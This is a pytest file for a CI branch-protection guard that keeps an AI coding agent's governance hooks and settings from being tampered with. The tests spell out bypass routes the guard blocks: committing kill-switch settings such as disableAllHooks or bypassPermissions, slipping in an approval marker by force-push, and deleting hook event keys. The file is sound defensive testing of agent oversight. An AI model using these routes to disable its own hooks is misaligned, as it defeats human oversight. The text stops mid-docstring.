"""Tests for Pack 5 Task 5-C: CI-tier branch-protection guard.

Each test builds a fresh temp git repo and invokes ci_guard.py with a
controlled environment, then asserts exit code + message content.
"""
from __future__ import annotations

import contextlib
import json
import os
import subprocess
import sys
from pathlib import Path

import pytest

from tests._symlink_support import requires_symlink

ROOT = Path(__file__).resolve().parent.parent
CI_GUARD = ROOT / "tools" / "cc" / "ci_guard.py"


# ── fixture helpers ─────────────────────────────────────────────────────────


def _git(args: list[str], cwd: Path, env: dict | None = None) -> subprocess.CompletedProcess:
    merged = {**os.environ}
    if env:
        merged.update(env)
    return subprocess.run(
        ["git", *args], capture_output=True, text=True, cwd=str(cwd), env=merged, encoding="utf-8"
    )


def _git_env() -> dict:
    return {
        "GIT_AUTHOR_NAME": "test",
        "GIT_AUTHOR_EMAIL": "t@t",
        "GIT_COMMITTER_NAME": "test",
        "GIT_COMMITTER_EMAIL": "t@t",
    }


@pytest.fixture
def fresh_repo(tmp_path):
    """Create a temp git repo with `main` branch and an initial commit."""
    env = _git_env()
    _git(["init", "-b", "main"], tmp_path, env)
    (tmp_path / "README.md").write_text("init\n", encoding="utf-8")
    _git(["add", "."], tmp_path, env)
    _git(["commit", "-m", "init"], tmp_path, env)
    return tmp_path


def _run_guard(repo: Path, env_overrides: dict | None = None) -> subprocess.CompletedProcess:
    env = {**os.environ}
    # Clear any CI env that might leak from a parent runner. GITHUB_ACTOR and
    # GITHUB_EVENT_NAME are on this list because ci_guard now READS them: on a
    # real Dependabot PR the runner sets GITHUB_ACTOR=dependabot[bot], which
    # would leak into these subprocesses and silently satisfy the allowance —
    # turning any future deny-expecting workflow fixture green once a week and
    # red the rest of the time. Scrub every ambient input the guard consults.
    for k in ("BASE_SHA", "BEFORE_SHA", "PR_TITLE", "PR_HEAD_SHA", "GITHUB_ACTOR",
              "GITHUB_EVENT_NAME"):
        env.pop(k, None)
    if env_overrides:
        env.update({k: v for k, v in env_overrides.items() if v is not None})
    return subprocess.run(
        [sys.executable, str(CI_GUARD)],
        capture_output=True, text=True, timeout=15, cwd=str(repo), env=env, encoding="utf-8",
    )


def _commit(repo: Path, rel: str, content: str, message: str) -> None:
    env = _git_env()
    target = repo / rel
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text(content, encoding="utf-8")
    _git(["add", "-A"], repo, env)
    _git(["commit", "-m", message], repo, env)


# ── tests ───────────────────────────────────────────────────────────────────


class TestProtectedPaths:
    def test_protected_change_no_marker_denies(self, fresh_repo):
        # Create a branch off main and change a protected path.
        env = _git_env()
        _git(["checkout", "-b", "feature"], fresh_repo, env)
        _commit(fresh_repo, "tools/cc/hooks/write_guard.py", "x = 1\n", "fix stuff")
        result = _run_guard(fresh_repo)
        assert result.returncode == 2
        assert "tools/cc/hooks/write_guard.py" in result.stdout

    def test_protected_change_with_commit_marker_allows(self, fresh_repo):
        """push event (direct-to-main): commit-message marker is the
        ONLY legitimate marker surface; PR_TITLE is unset for these
        triggers."""
        env = _git_env()
        _git(["checkout", "-b", "feature"], fresh_repo, env)
        _commit(
            fresh_repo,
            "tools/cc/hooks/write_guard.py",
            "x = 1\n",
            "HARNESS-UPDATE-APPROVED: legitimate hook update",
        )
        result = _run_guard(fresh_repo, {"GITHUB_EVENT_NAME": "push"})
        assert result.returncode == 0

    def test_protected_change_with_pr_title_marker_allows(self, fresh_repo):
        """pull_request event: PR_TITLE marker is the ONLY legitimate
        marker surface (force-push can rewrite commit-msg; cannot
        rewrite the PR title) -- and since DEF-338 the marker names the
        head it approves, so the title is `HARNESS-UPDATE-APPROVED@<sha>`
        with the head the workflow forwards as PR_HEAD_SHA."""
        env = _git_env()
        _git(["checkout", "-b", "feature"], fresh_repo, env)
        _commit(fresh_repo, "tools/cc/hooks/write_guard.py", "x = 1\n", "fix")
        head = _head(fresh_repo)
        result = _run_guard(fresh_repo, {
            "GITHUB_EVENT_NAME": "pull_request",
            "PR_TITLE": f"HARNESS-UPDATE-APPROVED@{head[:7]}: legitimate",
            "PR_HEAD_SHA": head,
        })
        assert result.returncode == 0, result.stdout

    def test_non_protected_change_allows(self, fresh_repo):
        env = _git_env()
        _git(["checkout", "-b", "feature"], fresh_repo, env)
        _commit(fresh_repo, "README.md", "# hi\n", "docs: update readme")
        result = _run_guard(fresh_repo)
        assert result.returncode == 0

    def test_workflow_deletion_is_protected(self, fresh_repo):
        env = _git_env()
        _commit(fresh_repo, ".github/workflows/harness-guard.yml", "x\n", "add wf")
        _git(["checkout", "-b", "feature"], fresh_repo, env)
        (fresh_repo / ".github/workflows/harness-guard.yml").unlink()
        _git(["add", "-A"], fresh_repo, env)
        _git(["commit", "-m", "remove wf"], fresh_repo, env)
        result = _run_guard(fresh_repo)
        assert result.returncode == 2
        assert ".github/workflows/harness-guard.yml" in result.stdout


class TestDiffBaseResolution:
    def test_base_sha_used_when_set(self, fresh_repo):
        """When BASE_SHA is set (PR context), ci_guard diffs against it."""
        env = _git_env()
        # Establish two commits ahead of main so BASE_SHA=first commit
        first = _git(["rev-parse", "HEAD"], fresh_repo, env).stdout.strip()
        _git(["checkout", "-b", "feature"], fresh_repo, env)
        _commit(fresh_repo, "unrelated.txt", "a\n", "add unrelated 1")
        _commit(fresh_repo, "tools/cc/hooks/write_guard.py", "b\n", "tamper hook")
        result = _run_guard(fresh_repo, {"BASE_SHA": first})
        assert result.returncode == 2
        assert "tools/cc/hooks/write_guard.py" in result.stdout

    def test_before_sha_zero_falls_back_to_merge_base(self, fresh_repo):
        env = _git_env()
        _git(["checkout", "-b", "feature"], fresh_repo, env)
        _commit(fresh_repo, "tools/cc/hooks/write_guard.py", "b\n", "tamper")
        # BEFORE_SHA=all-zeros simulates first push of a branch
        result = _run_guard(fresh_repo, {"BEFORE_SHA": "0" * 40})
        assert result.returncode == 2


class TestInstallCI:
    def test_install_ci_deploys_files(self, tmp_path):
        result = subprocess.run(
            [sys.executable, "-m", "espalier.cli", "install-ci", str(tmp_path)],
            capture_output=True, text=True, timeout=30, cwd=str(ROOT), encoding="utf-8",
        )
        assert result.returncode == 0
        assert (tmp_path / ".github" / "workflows" / "harness-guard.yml").exists()
        assert (tmp_path / "tools" / "cc" / "ci_guard.py").exists()
        assert "branch protection" in result.stdout.lower()

    def test_install_ci_reseeds_integrity_manifest_when_present(self, tmp_path):
        """TP-174b: init seeds .espalier/integrity.json BEFORE ci_guard.py and
        harness-guard.yml exist, so they're absent from the manifest and
        tampering goes undetected. install-ci must re-seed (existence-guarded)
        so both files enter the manifest."""
        (tmp_path / ".git").mkdir()
        init = subprocess.run(
            [sys.executable, "-m", "espalier.cli", "init", str(tmp_path)],
            capture_output=True, text=True, timeout=120, cwd=str(ROOT), encoding="utf-8",
        )
        assert init.returncode == 0, init.stderr
        manifest = tmp_path / ".espalier" / "integrity.json"
        before = json.loads(manifest.read_text(encoding="utf-8"))["files"]
        # ci_guard.py / harness-guard.yml don't exist at init time
        assert "tools/cc/ci_guard.py" not in before
        ci = subprocess.run(
            [sys.executable, "-m", "espalier.cli", "install-ci", str(tmp_path)],
            capture_output=True, text=True, timeout=30, cwd=str(ROOT), encoding="utf-8",
        )
        assert ci.returncode == 0, ci.stderr
        after = json.loads(manifest.read_text(encoding="utf-8"))["files"]
        assert "tools/cc/ci_guard.py" in after
        assert ".github/workflows/harness-guard.yml" in after

    def test_install_ci_rebaselines_the_fingerprint_it_changed(self, tmp_path):
        """DEF-688: install-ci writes .github/workflows/harness-guard.yml, which
        flips detect_ci, so the baseline init saved (ci_providers: []) no longer
        matches a fresh inference and the adopter's next documented step,
        `doctor .`, warns 'saved reports differ from fresh inference' about a
        change install-ci itself made. Driven 2026-09-05: ci_providers was the
        only changed key. install-ci must leave the same baseline a hand-run
        `fingerprint .` would."""
        (tmp_path / ".git").mkdir()
        init = subprocess.run(
            [sys.executable, "-m", "espalier.cli", "init", str(tmp_path)],
            capture_output=True, text=True, timeout=45, cwd=str(ROOT), encoding="utf-8",
        )
        assert init.returncode == 0, init.stderr
        fp_path = tmp_path / "reports" / "repo_fingerprint.json"
        before = json.loads(fp_path.read_text(encoding="utf-8"))
        assert "github_actions" not in before.get("ci_providers", []), before.get("ci_providers")
        ci = subprocess.run(
            [sys.executable, "-m", "espalier.cli", "install-ci", str(tmp_path)],
            capture_output=True, text=True, timeout=30, cwd=str(ROOT), encoding="utf-8",
        )
        assert ci.returncode == 0, ci.stderr
        assert "re-baselined reports/repo_fingerprint.json" in ci.stdout, ci.stdout
        after = json.loads(fp_path.read_text(encoding="utf-8"))
        assert "github_actions" in after.get("ci_providers", []), after.get("ci_providers")
        from espalier.diffing import diff_repo

        assert diff_repo(tmp_path)["fingerprint_changed"] is False

    def test_install_ci_without_a_baseline_writes_no_reports(self, tmp_path):
        """The existence guard: a repo that never ran init must not gain a
        reports/ directory from install-ci."""
        result = subprocess.run(
            [sys.executable, "-m", "espalier.cli", "install-ci", str(tmp_path)],
            capture_output=True, text=True, timeout=30, cwd=str(ROOT), encoding="utf-8",
        )
        assert result.returncode == 0, result.stderr
        assert not (tmp_path / "reports").exists()
        assert "re-baselined" not in result.stdout

    def test_install_ci_rebaseline_failure_is_a_warning_not_an_rc(self, tmp_path, monkeypatch, capsys):
        """The gate files are already deployed when the re-baseline runs; a
        failure there must stay rc=0 with a visible WARN, never a false
        'CI not installed'."""
        import argparse

        from espalier import cli as cli_mod

        (tmp_path / ".git").mkdir()
        assert cli_mod.cmd_init(argparse.Namespace(repo=str(tmp_path), config=None)) == 0

        def boom(*_a, **_k):
            raise RuntimeError("synthetic fingerprint failure")

        monkeypatch.setattr(cli_mod, "fingerprint_repo", boom)
        rc = cli_mod.cmd_install_ci(argparse.Namespace(repo=str(tmp_path)))
        captured = capsys.readouterr()
        assert rc == 0
        assert "could not re-baseline reports/repo_fingerprint.json" in captured.err
        assert (tmp_path / ".github" / "workflows" / "harness-guard.yml").exists()

    def test_install_ci_accepts_config_like_fingerprint(self):
        from espalier.cli import build_parser

        ns = build_parser().parse_args(["install-ci", ".", "--config", "custom.toml"])
        assert ns.config == "custom.toml"

    def test_crlf_workflow_compares_equal(self, tmp_path):
        """XPLAT-02 earn-the-red: a CRLF copy of espalier's OWN workflow.

        A raw read_bytes() compare called an identical file "different" on a
        Windows adopter whose committed YAML came back from git as CRLF. Not
        cosmetic: install-ci littered harness-guard.yml.new AND reported
        ci_gate_active=False, so the adopter's PR merge-gate read as parked
        over line endings alone. .gitattributes pins eol=lf for *.py/*.md but
        not *.yml — and an adopter's repo does not inherit ours regardless.

        Fixture-driven (the CRLF bytes are written here), so it runs on any host.
        """
        first = subprocess.run(
            [sys.executable, "-m", "espalier.cli", "install-ci", str(tmp_path)],
            capture_output=True, text=True, timeout=30, cwd=str(ROOT), encoding="utf-8",
        )
        assert first.returncode == 0, first.stderr
        workflow = tmp_path / ".github" / "workflows" / "harness-guard.yml"
        guard = tmp_path / "tools" / "cc" / "ci_guard.py"
        for path in (workflow, guard):
            path.write_bytes(path.read_bytes().replace(b"\n", b"\r\n"))

        second = subprocess.run(
            [sys.executable, "-m", "espalier.cli", "install-ci", str(tmp_path)],
            capture_output=True, text=True, timeout=30, cwd=str(ROOT), encoding="utf-8",
        )
        assert second.returncode == 0, second.stderr
        assert not workflow.with_name(workflow.name + ".new").exists(), (
            "a CRLF copy of espalier's own workflow was treated as a "
            "host-authored different file and parked in .new"
        )
        # The WARN goes to STDERR; checking stdout alone would pass even when
        # the warning fired, which is exactly the assertion this test exists
        # to make. Combine both streams.
        combined = second.stdout + second.stderr
        assert "differs from espalier" not in combined
        assert "unchanged: .github/workflows/harness-guard.yml" in combined

    def test_bom_prefixed_workflow_compares_equal(self, tmp_path):
        """The other half of the same Windows class as CRLF.

        Notepad and a PowerShell `Out-File` round-trip add a UTF-8 BOM. Fixing
        only the line endings left the identical symptom reachable by a second,
        equally ordinary route: .new littered and ci_gate_active reported False
        for a byte-identical workflow.
        """
        first = subprocess.run(
            [sys.executable, "-m", "espalier.cli", "install-ci", str(tmp_path)],
            capture_output=True, text=True, timeout=30, cwd=str(ROOT), encoding="utf-8",
        )
        assert first.returncode == 0, first.stderr
        workflow = tmp_path / ".github" / "workflows" / "harness-guard.yml"
        # BOM *and* CRLF — the realistic Windows round-trip does both at once.
        workflow.write_bytes(
            b"\xef\xbb\xbf" + workflow.read_bytes().replace(b"\n", b"\r\n")
        )
        second = subprocess.run(
            [sys.executable, "-m", "espalier.cli", "install-ci", str(tmp_path)],
            capture_output=True, text=True, timeout=30, cwd=str(ROOT), encoding="utf-8",
        )
        assert second.returncode == 0, second.stderr
        assert not workflow.with_name(workflow.name + ".new").exists()
        assert "differs from espalier" not in second.stdout + second.stderr

    def test_genuinely_different_workflow_still_warns(self, tmp_path):
        """Negative control for the EOL normalization.

        Normalizing line endings must not make install-ci start clobbering a
        HOST-authored workflow: real content differences still park in .new.
        """
        first = subprocess.run(
            [sys.executable, "-m", "espalier.cli", "install-ci", str(tmp_path)],
            capture_output=True, text=True, timeout=30, cwd=str(ROOT), encoding="utf-8",
        )
        assert first.returncode == 0, first.stderr
        workflow = tmp_path / ".github" / "workflows" / "harness-guard.yml"
        with workflow.open("a", encoding="utf-8") as fh:
            fh.write("\n# the host's own extra job\n")

        second = subprocess.run(
            [sys.executable, "-m", "espalier.cli", "install-ci", str(tmp_path)],
            capture_output=True, text=True, timeout=30, cwd=str(ROOT), encoding="utf-8",
        )
        assert second.returncode == 0, second.stderr
        assert workflow.with_name(workflow.name + ".new").exists()
        assert "differs from espalier" in second.stdout + second.stderr

    def test_install_ci_does_not_create_manifest_when_absent(self, tmp_path):
        """TP-174b negative: install-ci on a repo that never opted into
        integrity tracking must NOT create .espalier/integrity.json (the
        re-seed is existence-guarded)."""
        result = subprocess.run(
            [sys.executable, "-m", "espalier.cli", "install-ci", str(tmp_path)],
            capture_output=True, text=True, timeout=30, cwd=str(ROOT), encoding="utf-8",
        )
        assert result.returncode == 0
        assert not (tmp_path / ".espalier" / "integrity.json").exists()


class TestGitignoredSettings:
    def test_gitignored_settings_changes_do_not_fire(self, fresh_repo):
        """If .claude/settings.json is gitignored, local edits never appear
        in git diff and the guard doesn't fire."""
        env = _git_env()
        (fresh_repo / ".gitignore").write_text(".claude/settings.json\n", encoding="utf-8")
        (fresh_repo / ".claude").mkdir()
        (fresh_repo / ".claude" / "settings.json").write_text('{"local": true}', encoding="utf-8")
        _git(["add", "-A"], fresh_repo, env)
        _git(["commit", "-m", "ignore settings"], fresh_repo, env)
        _git(["checkout", "-b", "feature"], fresh_repo, env)
        # Modify locally — should not be tracked
        (fresh_repo / ".claude" / "settings.json").write_text('{"tampered": true}', encoding="utf-8")
        _commit(fresh_repo, "README.md", "# edit\n", "docs")
        result = _run_guard(fresh_repo)
        assert result.returncode == 0


class TestCommittedKillSwitchBlocked:
    """Kill-switch settings cannot be committed to the public project, even
    with the HARNESS-UPDATE-APPROVED marker. CI is the merge-time guarantee
    when local hooks (which may be disabled) cannot enforce."""

    def _commit_settings(self, repo: Path, rel: str, payload: dict, message: str) -> None:
        import json as _json
        env = _git_env()
        (repo / Path(rel).parent).mkdir(parents=True, exist_ok=True)
        (repo / rel).write_text(_json.dumps(payload), encoding="utf-8")
        _git(["add", "-A"], repo, env)
        _git(["commit", "-m", message], repo, env)

    def test_unparseable_settings_fails_the_merge_gate(self, fresh_repo):
        """The gate must not read "could not parse" as "clean".

        `_scan_settings_file_for_kill_switch` returned [] on any parse failure,
        so a committed settings.json the gate could not read scored the same as
        one it read and found clean. The BOM arm of exactly this class was
        closed here previously; the general case was left open. This is the
        MERGE gate and it is non-interactive, so unlike write_guard there is no
        lockout risk in failing closed.
        """
        env = _git_env()
        _git(["checkout", "-b", "feature"], fresh_repo, env)
        p = fresh_repo / ".claude" / "settings.json"
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text('{"disableAllHooks": true,}', encoding="utf-8")
        _git(["add", "-A"], fresh_repo, env)
        _git(["commit", "-m", "unparseable settings"], fresh_repo, env)
        result = _run_guard(fresh_repo)
        assert result.returncode != 0, (
            "an unparseable committed settings.json passed the merge gate"
        )
        assert "unparseable" in (result.stdout + result.stderr)

    def test_disable_all_hooks_in_settings_fails_without_approval(self, fresh_repo):
        env = _git_env()
        _git(["checkout", "-b", "feature"], fresh_repo, env)
        self._commit_settings(
            fresh_repo, ".claude/settings.json",
            {"disableAllHooks": True}, "settings",
        )
        result = _run_guard(fresh_repo)
        assert result.returncode == 2
        assert "kill-switch" in result.stdout.lower()
        assert "disableAllHooks" in result.stdout

    def test_disable_all_hooks_in_settings_fails_even_with_approval(self, fresh_repo):
        env = _git_env()
        _git(["checkout", "-b", "feature"], fresh_repo, env)
        self._commit_settings(
            fresh_repo, ".claude/settings.json",
            {"disableAllHooks": True},
            "HARNESS-UPDATE-APPROVED: this should still fail",
        )
        result = _run_guard(fresh_repo)
        assert result.returncode == 2, (
            "kill-switch settings cannot be committed even with the approval "
            "marker. The marker must NOT bypass this check."
        )
        assert "kill-switch" in result.stdout.lower()
        # The clarifying language must explicitly say the marker doesn't help.
        assert "approved" in result.stdout.lower() or "marker" in result.stdout.lower()

    def test_bypass_permissions_in_local_settings_fails(self, fresh_repo):
        env = _git_env()
        _git(["checkout", "-b", "feature"], fresh_repo, env)
        self._commit_settings(
            fresh_repo, ".claude/settings.local.json",
            {"permissions": {"defaultMode": "bypassPermissions"}},
            "settings.local",
        )
        result = _run_guard(fresh_repo)
        assert result.returncode == 2
        assert "bypassPermissions" in result.stdout

    def test_clean_settings_pass(self, fresh_repo):
        env = _git_env()
        _git(["checkout", "-b", "feature"], fresh_repo, env)
        self._commit_settings(
            fresh_repo, ".claude/settings.json",
            {"hooks": {}}, "clean settings",
        )
        result = _run_guard(fresh_repo)
        # Will fail on the protected-path check (no approval marker), but
        # must NOT fail on the kill-switch check. We assert the failure
        # message refers to protected paths, not kill-switch.
        if result.returncode != 0:
            assert "kill-switch" not in result.stdout.lower(), (
                "clean settings must not trigger the kill-switch check"
            )


# ---------------------------------------------------------------------------
# TP-58 BC-032 — trigger-aware approval-marker check
# ---------------------------------------------------------------------------


class TestApprovalMarkerForcePushResistance:
    """BC-032: pre-fix the approval marker was accepted from EITHER
    the HEAD commit message OR env.PR_TITLE. A PR author could
    force-push a new HEAD adding the marker text to the commit
    message AFTER a clean review and slip protected-zone changes
    past the gate. The trigger-aware fix routes by
    ``env.GITHUB_EVENT_NAME``:

      - pull_request / pull_request_target / merge_group: ONLY PR_TITLE.
      - push: ONLY commit-message.
      - workflow_dispatch / repository_dispatch / schedule / unknown
        / empty: REFUSE.

    Round-2 finding: the privileged twins ``pull_request_target`` and
    ``merge_group`` (which fire with secrets / on base-branch context
    / in the merge queue) were initially missed and reopened BC-032;
    the allowlist now includes them.
    """

    PR_LIKE_EVENTS = ["pull_request", "pull_request_target", "merge_group"]

    @pytest.mark.parametrize("event", PR_LIKE_EVENTS)
    def test_pr_like_events_reject_commit_msg_only_marker(
        self, event, fresh_repo,
    ):
        """Force-push laundering: marker in commit-msg but NOT
        in PR_TITLE -> ci_guard must REJECT on PR-like triggers."""
        env = _git_env()
        _git(["checkout", "-b", "feature"], fresh_repo, env)
        _commit(
            fresh_repo,
            "tools/cc/hooks/write_guard.py",
            "x = 1\n",
            "HARNESS-UPDATE-APPROVED: force-push laundering attempt",
        )
        result = _run_guard(fresh_repo, {
            "GITHUB_EVENT_NAME": event,
            "PR_TITLE": "Innocuous title (no marker)",
        })
        assert result.returncode == 2, (
            f"BC-032 regression on {event}: commit-msg marker accepted "
            f"without a PR_TITLE marker (force-push laundering window). "
            f"stdout: {result.stdout!r}"
        )

    @pytest.mark.parametrize("event", PR_LIKE_EVENTS)
    def test_pr_like_events_accept_pr_title_marker(
        self, event, fresh_repo,
    ):
        """The title marker names the head it approves (DEF-338); the bare
        form is the force-push residual and is refused, see
        TestApprovalBoundToHead."""
        env = _git_env()
        _git(["checkout", "-b", "feature"], fresh_repo, env)
        _commit(
            fresh_repo,
            "tools/cc/hooks/write_guard.py",
            "x = 1\n",
            "hook update (no marker in commit msg)",
        )
        head = _head(fresh_repo)
        result = _run_guard(fresh_repo, {
            "GITHUB_EVENT_NAME": event,
            "PR_TITLE": f"HARNESS-UPDATE-APPROVED@{head[:7]}: legitimate hook update",
            "PR_HEAD_SHA": head,
        })
        assert result.returncode == 0, result.stdout

    def test_push_event_accepts_commit_msg_marker(self, fresh_repo):
        env = _git_env()
        _git(["checkout", "-b", "feature"], fresh_repo, env)
        _commit(
            fresh_repo,
            "tools/cc/hooks/write_guard.py",
            "x = 1\n",
            "HARNESS-UPDATE-APPROVED: direct-to-main hot fix",
        )
        result = _run_guard(fresh_repo, {"GITHUB_EVENT_NAME": "push"})
        assert result.returncode == 0

    def test_push_event_does_not_consider_pr_title(self, fresh_repo):
        """push events must NOT honour PR_TITLE — only the commit-msg
        marker is the legitimate source on direct-to-main."""
        env = _git_env()
        _git(["checkout", "-b", "feature"], fresh_repo, env)
        _commit(
            fresh_repo,
            "tools/cc/hooks/write_guard.py",
            "x = 1\n",
            "hook update (no marker in commit msg)",
        )
        result = _run_guard(fresh_repo, {
            "GITHUB_EVENT_NAME": "push",
            "PR_TITLE": "HARNESS-UPDATE-APPROVED would-be-laundered",
        })
        assert result.returncode == 2, (
            "push event must require commit-msg marker; PR_TITLE on push "
            "is not a legitimate marker surface"
        )

    @pytest.mark.parametrize("event", [
        "workflow_dispatch", "repository_dispatch", "schedule",
        "", "unknown_event",
    ])
    def test_no_review_context_events_refuse_marker(self, event, fresh_repo):
        """Events with no review context (manual dispatch, cron,
        empty / unknown) MUST refuse the marker entirely. These
        triggers have no PR timeline AND no branch-protection gate;
        accepting the marker would be unconditional laundering."""
        env = _git_env()
        _git(["checkout", "-b", "feature"], fresh_repo, env)
        _commit(
            fresh_repo,
            "tools/cc/hooks/write_guard.py",
            "x = 1\n",
            "HARNESS-UPDATE-APPROVED: would-be laundered",
        )
        result = _run_guard(fresh_repo, {
            "GITHUB_EVENT_NAME": event,
            "PR_TITLE": "HARNESS-UPDATE-APPROVED would-be-laundered",
        })
        assert result.returncode == 2, (
            f"{event!r} event accepted the marker; should refuse "
            "(no review context = no legitimate marker surface)"
        )


class TestN7GovernanceEventCompleteness:
    """TP-169 §13 #8 (N7): a committed .claude/settings.json that drops a
    blocking governance EVENT key — while the hook file stays on disk — silently
    removes a DENY/blocking gate. The kill-switch loop only flags PRESENT keys,
    so a DELETED key sails through; and the real regression is an *approved*
    harness change that accidentally unwires a gate, which the protected-path
    + approval path lets through. The completeness check must fire UNCONDITION-
    ALLY (approval does not bypass), exactly like the kill-switch check.
    """

    def _entry(self, script: str, matcher: str = "") -> dict:
        e: dict = {"hooks": [{
            "type": "command", "command": "python3",
            "args": [f"${{CLAUDE_PROJECT_DIR}}/tools/cc/hooks/{script}"],
        }]}
        if matcher:
            e["matcher"] = matcher
        return e

    def _full_hooks(self) -> dict:
        return {
            "SessionStart": [self._entry("session_start.py")],
            "PreToolUse": [
                self._entry("write_guard.py", "*"),
                self._entry("plan_guard.py", "Write|Edit|NotebookEdit"),
            ],
            "ConfigChange": [self._entry("config_guard.py")],
            "Stop": [self._entry("stop_gate.py")],
        }

    def _commit_harness(self, repo: Path, hooks_block: dict, message: str) -> None:
        """Commit the four governance hook files on disk + a settings.json with
        the given hooks block. Hook files are protected paths, so callers pass
        an approval-marker message to isolate the governance check from the
        protected-paths check."""
        import json as _json
        env = _git_env()
        hooks_dir = repo / "tools" / "cc" / "hooks"
        hooks_dir.mkdir(parents=True, exist_ok=True)
        for s in ("write_guard.py", "plan_guard.py", "config_guard.py", "stop_gate.py"):
            (hooks_dir / s).write_text("import sys\nsys.exit(0)\n", encoding="utf-8")
        (repo / ".claude").mkdir(parents=True, exist_ok=True)
        (repo / ".claude" / "settings.json").write_text(_json.dumps({"hooks": hooks_block}), encoding="utf-8")
        _git(["add", "-A"], repo, env)
        _git(["commit", "-m", message], repo, env)

    _APPROVED = "HARNESS-UPDATE-APPROVED: legit harness change"

    def test_full_wiring_passes(self, fresh_repo):
        env = _git_env()
        _git(["checkout", "-b", "feature"], fresh_repo, env)
        self._commit_harness(fresh_repo, self._full_hooks(), self._APPROVED)
        result = _run_guard(fresh_repo, {"GITHUB_EVENT_NAME": "push"})
        assert result.returncode == 0, result.stdout
        assert "governance" not in result.stdout.lower()

    def test_deleted_configchange_fails_even_with_approval(self, fresh_repo):
        # The earn-the-red case: approval marker present (protected-paths
        # allows), but the deleted ConfigChange key must still fail the merge.
        env = _git_env()
        _git(["checkout", "-b", "feature"], fresh_repo, env)
        hooks = self._full_hooks()
        del hooks["ConfigChange"]
        self._commit_harness(fresh_repo, hooks, self._APPROVED)
        result = _run_guard(fresh_repo, {"GITHUB_EVENT_NAME": "push"})
        assert result.returncode == 2, result.stdout
        assert "config_guard.py" in result.stdout
        assert "governance" in result.stdout.lower()

    def test_deleted_pretooluse_flags_both_scripts(self, fresh_repo):
        env = _git_env()
        _git(["checkout", "-b", "feature"], fresh_repo, env)
        hooks = self._full_hooks()
        del hooks["PreToolUse"]
        self._commit_harness(fresh_repo, hooks, self._APPROVED)
        result = _run_guard(fresh_repo, {"GITHUB_EVENT_NAME": "push"})
        assert result.returncode == 2, result.stdout
        assert "write_guard.py" in result.stdout
        assert "plan_guard.py" in result.stdout

    def test_no_hooks_block_does_not_fire(self, fresh_repo):
        # A non-harness settings.json (no governance hook files on disk) must
        # not trip the governance check (mirrors test_clean_settings_pass).
        env = _git_env()
        _git(["checkout", "-b", "feature"], fresh_repo, env)
        import json as _json
        (fresh_repo / ".claude").mkdir(parents=True, exist_ok=True)
        (fresh_repo / ".claude" / "settings.json").write_text(_json.dumps({"hooks": {}}), encoding="utf-8")
        _git(["add", "-A"], fresh_repo, env)
        _git(["commit", "-m", "clean"], fresh_repo, env)
        result = _run_guard(fresh_repo)
        assert "governance" not in result.stdout.lower()


class TestGovernanceMirrorParity:
    """TP-169 §13 #8 (N7): ci_guard's inline _GOVERNANCE_BLOCKING_HOOKS literal
    (zero-imports rule) must stay byte-equal to the espalier SoT. ci_guard is
    pure-stdlib, so it loads standalone via importlib."""

    def _load_ci_guard(self):
        import importlib.util
        spec = importlib.util.spec_from_file_location("_ci_guard_mod", CI_GUARD)
        mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
        return mod

    def test_workflow_forwards_every_env_ci_guard_reads(self):
        """`ci_guard` reads its inputs from the environment; the workflow's
        `env:` block is the only thing that puts them there. Nothing pinned that
        pairing -- `DEFAULT_BRANCH` appeared in tests only as a value handed
        straight to `resolve_base`, never as something the YAML supplies.

        A hurried edit to that block (or an adopter re-installing an older
        asset) drops a line, the operand is silently lost, `master` adopters
        return to the fail-closed regression, and the suite stays green. The
        workflow's own `GITHUB_ACTOR` comment argues exactly this risk about
        exactly this block -- so this is a class, not one line.
        """
        wf = (ROOT / ".github" / "workflows" / "harness-guard.yml").read_text(
            encoding="utf-8")
        for key in ("BASE_SHA", "BEFORE_SHA", "PR_TITLE", "GITHUB_EVENT_NAME",
                    "GITHUB_ACTOR", "DEFAULT_BRANCH"):
            assert f"{key}:" in wf, (
                f"ci_guard reads {key} from the environment but the workflow no "
                f"longer forwards it -- the gate silently loses that input."
            )
        assert "branches: [main, master]" in wf, (
            "the push trigger no longer lists both common default-branch "
            "spellings; an adopter on the other one gets zero push-time "
            "enforcement, silently."
        )

    def test_degenerate_base_equal_to_head_does_not_silence_the_gate(self, tmp_path):
        """A base EQUAL TO HEAD yields an empty diff, and an empty diff means this
        gate inspects nothing -- a tampered protected path is invisible and the
        approval marker is never demanded. That is a FAIL-OPEN, and it needs no
        bad input: `merge-base X HEAD` IS HEAD whenever X is the branch being
        pushed, i.e. the first push of a repo whose default branch is the one
        being pushed.

        PRE-EXISTING, verified against the pre-operand code -- the first push of
        a `main`-default repo already resolved base == HEAD before DEFAULT_BRANCH
        existed. The operand widens WHICH repos reach it, so it is closed here.

        Falling through fails CLOSED (everything reads as changed, the marker is
        demanded). For a gate, loud and wrong beats silent and open.
        """
        import os
        import subprocess
        mod = self._load_ci_guard()

        def git(*a):
            return subprocess.run(["git", *a], cwd=tmp_path,
                                  capture_output=True, text=True, encoding="utf-8")

        git("init", "-b", "main")
        git("config", "user.email", "t@t")
        git("config", "user.name", "t")
        (tmp_path / "app.py").write_text("x\n", encoding="utf-8")
        git("add", "-A")
        git("commit", "-m", "adopter code")
        hooks = tmp_path / "tools" / "cc" / "hooks"
        hooks.mkdir(parents=True)
        (hooks / "write_guard.py").write_text("guard\n", encoding="utf-8")
        git("add", "-A")
        git("commit", "-m", "espalier init")
        head = git("rev-parse", "HEAD").stdout.strip()
        first = git("rev-list", "--max-parents=0", "HEAD").stdout.strip()

        push = {"GITHUB_EVENT_NAME": "push", "BEFORE_SHA": "0" * 40}
        cwd = os.getcwd()
        os.chdir(tmp_path)
        try:
            plain = mod.resolve_base(dict(push))
            named = mod.resolve_base(dict(push, DEFAULT_BRANCH="main"))
        finally:
            os.chdir(cwd)

        for label, base in (("no operand", plain), ("DEFAULT_BRANCH=main", named)):
            assert base != head, (
                f"{label}: resolve_base returned HEAD itself, so the diff is "
                "empty and a tampered protected path would pass unseen."
            )
            assert base == first, (
                f"{label}: expected the fail-CLOSED fallback (initial commit "
                f"{first[:10]}), got {base[:10]}"
            )

    def test_default_branch_operand_rescues_a_master_adopter(self, tmp_path):
        """4-C: on a `master` adopter, a new-branch push sends an all-zeros
        `before`; both `origin/main` and `main` fail, and the last resort diffs
        against the INITIAL COMMIT -- so every protected path reads as changed,
        the approval marker becomes required, and the adopter's first branch push
        exits 2. Widening the workflow's push filter WITHOUT this operand converts
        silent zero-enforcement into loud wrong-enforcement on exactly the
